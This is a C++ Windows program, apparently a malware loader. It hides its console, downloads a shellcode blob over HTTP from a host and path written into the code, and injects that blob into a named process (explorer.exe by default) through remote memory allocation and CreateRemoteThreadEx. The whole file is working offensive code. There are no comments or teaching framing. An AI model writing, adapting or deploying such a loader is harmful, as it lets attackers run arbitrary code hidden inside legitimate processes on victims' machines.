#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string>
#include <tlhelp32.h>
#include <minidumpapiset.h>
#include <iostream>
#include <shellapi.h>

#pragma comment (lib, "Wininet.lib")



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow);


struct Shellcode {
	byte* data;
	DWORD len;
};

Shellcode Download(LPCWSTR host, INTERNET_PORT port);
void Execute(Shellcode shellcode, DWORD PID);
DWORD ProcessIdByName(const std::wstring processName);



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam, int iCmdShow)
{

	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	std::wstring processName;

	int argc;
	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argv[1]) {
		processName = argv[1];
	}
	else {
		processName = L"explorer.exe";
	}

	std::string args(szCmdParam);

	Shellcode shellcode = Download(L"localhost", 80);
	DWORD pTarget = ProcessIdByName(processName);
	Execute(shellcode, pTarget);


	return 0;
}

Shellcode Download(LPCWSTR host, INTERNET_PORT port) {
	HINTERNET session = InternetOpen(
		L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	HINTERNET connection = InternetConnect(
		session,
		host,
		port,
		L"",
		L"",
		INTERNET_SERVICE_HTTP,
		0,
		0);

	HINTERNET request = HttpOpenRequest(
		connection,
		L"GET",
		L"/api/arts/bin/program.bin",
		NULL,
		NULL,
		NULL,
		0,
		0);

	WORD counter = 0;
	while (!HttpSendRequest(request, NULL, 0, 0, 0)) {

		counter++;
		Sleep(3000);
		if (counter >= 3) {
			exit(0);
		}
	}

	DWORD bufSize = BUFSIZ;
	byte* buffer = new byte[bufSize];

	DWORD capacity = bufSize;
	byte* payload = (byte*)malloc(capacity);

	DWORD payloadSize = 0;

	while (true) {
		DWORD bytesRead;

		if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
			exit(0);
		}

		if (bytesRead == 0) break;

		if (payloadSize + bytesRead > capacity) {
			capacity *= 2;
			byte* newPayload = (byte*)realloc(payload, capacity);
			payload = newPayload;
		}

		for (DWORD i = 0; i < bytesRead; i++) {
			payload[payloadSize++] = buffer[i];
		}

	}
	byte* newPayload = (byte*)realloc(payload, payloadSize);

	InternetCloseHandle(request);
	InternetCloseHandle(connection);
	InternetCloseHandle(session);

	struct Shellcode out;
	out.data = payload;
	out.len = payloadSize;

	std::cout << out.data;
	std::cin;
	return out;
}

void Execute(Shellcode shellcode, DWORD PID) {

	if (0 == shellcode.len) {
		exit;
	}


	BOOL   STATE = TRUE;
	HANDLE ProcessHandle = NULL;
	HANDLE ThreadHandle = NULL;
	PVOID  RemoteBuffer = NULL;
	DWORD  OldProtection = 0;


	ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (NULL == ProcessHandle) {
		exit;
	}

	RemoteBuffer = VirtualAllocEx(ProcessHandle, NULL, shellcode.len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

	if (NULL == RemoteBuffer) {
		exit;
	}


	if (!WriteProcessMemory(ProcessHandle, RemoteBuffer, shellcode.data, shellcode.len, 0))
	{
		exit;
	}

	if (!VirtualProtectEx(ProcessHandle, RemoteBuffer, shellcode.len, PAGE_EXECUTE_READ, &OldProtection)) {
		exit;
	}

	ThreadHandle = CreateRemoteThreadEx(
		ProcessHandle,
		NULL,
		0,
		(PTHREAD_START_ROUTINE)RemoteBuffer,
		NULL,
		0,
		0,
		0
	);

	if (NULL == ThreadHandle) {
		exit;
	}


	WaitForSingleObject(ThreadHandle, INFINITE);


	if (ThreadHandle) {
		CloseHandle(ThreadHandle);
	}

	if (ProcessHandle) {
		CloseHandle(ProcessHandle);
	}

	if (RemoteBuffer) {
		VirtualFree(RemoteBuffer, 0, MEM_RELEASE);
	}


}


DWORD ProcessIdByName(const std::wstring processName) {

	DWORD processId = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 processEntry = {};
		processEntry.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(snapshot, &processEntry)) {
			do {
				std::wstring currentProcessName(processEntry.szExeFile);

				if (processName == currentProcessName) {
					processId = processEntry.th32ProcessID;
					break;
				}

			} while (Process32Next(snapshot, &processEntry));
		}
	}

	CloseHandle(snapshot);
	return processId;
}